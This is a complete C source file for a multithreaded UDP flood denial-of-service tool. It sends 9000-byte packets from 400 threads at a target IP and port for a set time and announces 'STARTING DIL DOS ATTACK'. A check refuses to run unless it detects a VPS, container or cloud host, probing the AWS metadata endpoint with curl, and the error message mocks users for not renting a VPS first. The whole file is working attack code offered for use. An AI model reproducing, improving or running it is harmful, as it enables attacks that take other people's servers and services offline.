#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DEFAULT_MESSAGE_SIZE 9000
#define DEFAULT_THREADS 400

struct thread_args {
    char ip[16];
    int port;
    int duration;
};

void *send_udp_packets(void *arg) {
    struct thread_args *args = (struct thread_args *)arg;
    char *ip = args->ip;
    int port = args->port;
    int duration = args->duration;

    int sockfd;
    struct sockaddr_in servaddr;
    char *message;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &servaddr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sockfd);
        return NULL;
    }

    message = (char *)malloc(DEFAULT_MESSAGE_SIZE);
    if (message == NULL) {
        perror("Memory allocation failed");
        close(sockfd);
        return NULL;
    }
    memset(message, 'A', DEFAULT_MESSAGE_SIZE);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        ssize_t bytes_sent = sendto(sockfd, message, DEFAULT_MESSAGE_SIZE, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
        if (bytes_sent < 0) {
            perror("sendto failed");
            break;
        }
        usleep(100);
    }

    free(message);
    close(sockfd);
    return NULL;
}

int is_vps() {
    if (access("/proc/vz/ve-ct/veinfo", F_OK) != -1) return 1;  // OpenVZ
    if (access("/proc/xen/vcpuinfo", F_OK) != -1) return 1;
    if (access("/.dockerenv", F_OK) != -1) return 1;
    if (access("/run/systemd/container", F_OK) != -1) return 1;

    FILE *fp = fopen("/proc/cpuinfo", "r");
    if (fp != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), fp) != NULL) {
            if (strstr(line, "Hypervisor") != NULL) {
                fclose(fp);
                return 1;
            }
        }
        fclose(fp);
    }

    fp = fopen("/proc/self/status", "r");
    if (fp != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), fp) != NULL) {
            if (strncmp(line, "VmSize:", 7) == 0) {
                int vmSizeKB = atoi(line + 7);
                fclose(fp);
                return (vmSizeKB < 500000) ? 1 : 0;
            }
        }
        fclose(fp);
    }

    if (system("command -v curl >/dev/null 2>&1") == 0) {
        if (system("curl -s -f -m 5 http://169.254.169.254/latest/meta-data/instance-id > /dev/null 2>&1") == 0) {
            return 1;  // AWS EC2 instance detected
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s [IP] [PORT] [TIME]\n", argv[0]);
        return 1;
    }

    if (!is_vps()) {
        fprintf(stderr, "Error: GARIB VPS LE PHELE SALE FIR BINARY USE KARNA \n");
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = DEFAULT_THREADS;

    pthread_t threads[num_threads];
    struct thread_args args[num_threads];

    printf("STARTING DIL DOS ATTACK ON %s:%d for %d seconds with %d threads\n", ip, port, duration, num_threads);

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].ip, ip, sizeof(args[i].ip) - 1);
        args[i].ip[sizeof(args[i].ip) - 1] = '\0';
        args[i].port = port;
        args[i].duration = duration;
        if (pthread_create(&threads[i], NULL, send_udp_packets, &args[i]) != 0) {
            perror("Failed to create thread");
            for (int j = 0; j < i; j++) {
                pthread_cancel(threads[j]);
                pthread_join(threads[j], NULL);
            }
            return 1;
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("ATTACK COMPLETED\n");

    return 0;
}